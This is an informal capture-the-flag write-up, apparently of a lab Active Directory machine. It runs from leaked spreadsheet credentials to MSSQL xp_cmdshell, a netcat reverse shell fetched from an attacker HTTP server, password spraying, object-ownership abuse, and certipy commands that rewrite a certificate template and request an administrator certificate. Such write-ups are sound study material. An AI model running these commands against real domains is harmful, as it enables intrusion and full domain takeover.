AD
10.129.232.128


rose / KxEPkKe6R8su


using this credential  we found that we have access on smb

![[Pasted image 20260722134027.png]]

looking at it  we shound a non defualt share

![[Pasted image 20260722134056.png]]

we investigated more 

![[Pasted image 20260722134120.png]]


in accounting there was nothing and accounts was damages 

using strings we didnt find anything intersting so i did  extract the accounts.xlsx using binwalk 

![[Pasted image 20260722141413.png]]

so that what was inside 

![[Pasted image 20260722141605.png]]

always check `sharedStrings.xml` since it contains  All text strings used in the spreadsheet


![[Pasted image 20260722141244.png]]

it looks like an MS SQL USER AND PASSWORD 


so it was true its a username and pass 

![[Pasted image 20260722142656.png]]



we noticed that we can enable xp cmd by literally writing `enable_xp_cmdshell `and we tested that by writing `xp_cmdshell whoami`

so lets start dropping shells we for sure enable http server on attacker 

![[Pasted image 20260722162529.png]]


now we have nc on the machine  

enable nc -lnvp 1337  from client 

![[Pasted image 20260722162753.png]]


![[Pasted image 20260722162802.png]]


after scrolling around i found the mssql configuration settings there is a password lets spray it around the existing users 

![[Pasted image 20260722163524.png]]


ryan / WqSZAF6CysDQbGb3



![[Pasted image 20260722163846.png]]

we have a foothold of another user  
![[Pasted image 20260722164110.png]]


lets start checking out what can we do here there is no inserting permissions 
Sharphound 
![[Pasted image 20260723140811.png]]

we have a writeOwner permission  on ca_svc
![[Pasted image 20260723140839.png]]


take woonership 
![[Pasted image 20260723162556.png]]

give full permission "GrantAll" 
![[Pasted image 20260723172613.png]]

Chnage password 
![[Pasted image 20260723172525.png]]
for some reason it didnt work  so lets go for other solution using windows 

import power-view
![[Pasted image 20260723174236.png]]

Take Ownership
![[Pasted image 20260727173101.png]]

give resetpassword permissions 
![[Pasted image 20260727174516.png]]

change Password "i wriote `Password123!!` here but in the next payloads i used `password123`"

![[Pasted image 20260727174538.png|517]]

![[Pasted image 20260727174548.png]]

check if it works 
![[Pasted image 20260723175845.png]]

check the certifications 
![[Pasted image 20260723180017.png]]


get the vulnerable templates 
![[Pasted image 20260723180135.png]]

there is one with esc4 

![[Pasted image 20260728144035.png]]


for some reason we had dns error  so i checked 
The template had `Enrollee Supplies Subject: False`.  that flag decides who gets to fill in the identity on the certificate. When it's False, you don't  the CA fills it in for you 

so we move to esc1 


```sh
#wrote the template's settings. It flipped `Enrollee Supplies Subject` to True
certipy template   -u ca_svc -p 'password123'   -dc-ip 10.129.232.128   -template DunderMifflinAuthentication   -save-configuration DunderMifflin.json   -write-default-configuration


#request a certificate and tell the CA
certipy req -u ca_svc -p 'password123'  -dc-ip 10.129.232.128  -target DC01.sequel.htb  -ca sequel-DC01-CA  -template DunderMifflinAuthentication -upn administrator@sequel.htb

#authetnicate to DC  
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

![[Pasted image 20260729163447.png]]
- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/index.html